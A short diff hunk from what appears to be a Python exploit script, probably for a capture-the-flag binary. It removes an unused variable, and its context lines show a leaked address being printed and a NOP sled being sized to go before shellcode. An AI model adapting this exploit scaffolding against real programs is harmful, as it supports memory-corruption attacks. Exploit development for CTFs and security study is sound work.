@@ -44,8 +44,6 @@ print(f"Got leaked address: {hex(leaked_addr)}")
 
 print(f"Received: {p.recvuntil(b'(y/n): ')}")
 
-deadcode = p64(0xdeadc0de)
-
 payload_len = 58
 num_nops = payload_len - len(shellcode)
 print(f"Prepending payload with nopsled of len {num_nops}")
